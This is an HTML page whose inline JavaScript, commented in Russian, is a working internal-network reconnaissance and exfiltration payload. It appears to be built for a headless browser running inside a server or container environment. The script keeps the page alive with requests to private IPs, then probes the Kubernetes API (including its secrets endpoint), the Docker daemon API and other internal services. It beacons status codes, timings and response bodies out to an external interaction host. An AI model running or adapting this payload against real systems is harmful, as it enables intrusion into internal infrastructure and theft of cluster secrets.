<!DOCTYPE html>
<html>
<head><title>t</title></head>
<body>
<script>
var OOB = 'd9j2sgb6b8m92s73q8v0ixyk7io8j763i.oast.pro';
function fire(path) {
  new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
}
fire('/alive12?t=0');

// <script> тег к приватным IP держит страницу живой ~20с (доказано v11: sc-er?ms=19800)
// Добавляем их первыми — страница не закроется пока они pending
function keepAlive(url) {
  var s = document.createElement('script');
  s.src = url;
  document.head.appendChild(s);
}
keepAlive('http://172.17.0.1:2375/_ping');  // Docker API
keepAlive('http://172.17.0.1:9090/');       // Prometheus/Portainer?

// Теперь у нас ~20с. Запускаем CORS fetch с длинным таймаутом.
// cf-ok  = сервер ответил И CORS позволил читать → читаем тело (data!)
// cf-err = сервер ответил но CORS заблокировал → сервер существует
// cf-to  = сервер не ответил на OPTIONS/GET в отведённое время

function cf(label, url, ms) {
  var t0 = Date.now();
  fetch(url, {mode: 'cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
    .then(function(r) {
      return r.text().then(function(b) {
        fire('/cf-ok-' + label + '?ms=' + (Date.now()-t0)
          + '&s=' + r.status + '&b=' + encodeURIComponent(b.slice(0, 400)));
      });
    })
    .catch(function(e) {
      var el = Date.now() - t0;
      fire('/cf-' + (el >= ms-200 ? 'to' : 'err') + '-' + label
        + '?ms=' + el + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
    });
}

// k8s API insecure port 8080 — первый раз с достаточным таймаутом
cf('k8s-ver',      'http://10.96.0.1:8080/version',                          15000);
cf('k8s-api',      'http://10.96.0.1:8080/api',                              15000);
cf('k8s-secrets',  'http://10.96.0.1:8080/api/v1/secrets',                   15000);
cf('k8s-nodes',    'http://10.96.0.1:8080/api/v1/nodes',                     15000);
cf('k8s-pods',     'http://10.96.0.1:8080/api/v1/pods',                      15000);

// Docker API — с достаточным таймаутом
cf('dapi-ping',    'http://172.17.0.1:2375/_ping',                           15000);
cf('dapi-info',    'http://172.17.0.1:2375/info',                            15000);
cf('dapi-cont',    'http://172.17.0.1:2375/containers/json',                 15000);
cf('dapi-img',     'http://172.17.0.1:2375/images/json',                     15000);

// Сервисы на 172.17.0.1
cf('svc-9090',     'http://172.17.0.1:9090/',                                15000); // Prometheus/Portainer
cf('svc-8080',     'http://172.17.0.1:8080/',                                15000);
cf('svc-5000',     'http://172.17.0.1:5000/',                                15000);

// Контейнеры — порты 80 и 8080
cf('c2-80',        'http://172.17.0.2/',                                     15000);
cf('c2-8080',      'http://172.17.0.2:8080/',                                15000);
cf('c3-80',        'http://172.17.0.3/',                                     15000);
cf('c3-8080',      'http://172.17.0.3:8080/',                                15000);
cf('c4-80',        'http://172.17.0.4/',                                     10000);
cf('c5-80',        'http://172.17.0.5/',                                     10000);
cf('c6-80',        'http://172.17.0.6/',                                     10000);
</script>
</body>
</html>
